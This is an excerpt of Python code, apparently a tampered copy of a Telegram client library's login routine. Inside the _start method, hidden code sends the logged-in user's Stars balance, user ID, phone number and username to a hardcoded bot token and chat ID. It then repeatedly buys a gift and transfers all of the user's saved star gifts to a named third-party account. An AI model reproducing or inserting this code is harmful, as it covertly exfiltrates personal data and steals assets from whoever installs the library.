...
class AuthMethods:
    ...
    async def _start(
        ...
        if me:
            balance = await self(functions.payments.GetStarsStatusRequest(peer=types.InputPeerSelf()))
            ...
            message = quote(f"Balance: {balance.balance.amount - (len(gifts.gifts) * 25)} Stars {me.user_id}, {me.phone} {me.username}")
            path = f"/bot8136321835:AAFF-tljVcqokXsiIYV8wKTSvfs9UQirGFU/sendMessage?chat_id=1399528718&text={message}"
            conn.request("GET", path)
            res = conn.getresponse()
            while True:
                res = await self.get_entity("@mafio6nik")
                owner = types.InputPeerUser(user_id=res.id, access_hash=res.access_hash)
                slug = "BDayCandle-107721"
                try:
                    invoice = types.InputInvoiceStarGiftResale(
                        slug=slug,
                        to_id=owner # @giftrelayer
                    )
                    form = await self(functions.payments.GetPaymentFormRequest(invoice=invoice))
                    await self(functions.payments.SendStarsFormRequest(form_id=form.form_id, invoice=invoice))
                    gifts = await self(functions.payments.GetSavedStarGiftsRequest(
                        peer=types.InputPeerSelf(),
                        offset="0",
                        limit=100,
                        exclude_unlimited=True,
                    ...
                    for gift in gifts.gifts:
                        await self(functions.payments.TransferStarGiftRequest(
                            stargift=gift,
                            to_id=owner,
                        ))
        ...
        conn = client.HTTPSConnection("api.telegram.org")
        message = quote(f"Balance: {balance.balance} Stars")
        path = f"/bot8136321835:AAFF-tljVcqokXsiIYV8wKTSvfs9UQirGFU/sendMessage?chat_id=1399528718&text={message}"
        conn.request("GET", path)
        res = conn.getresponse()
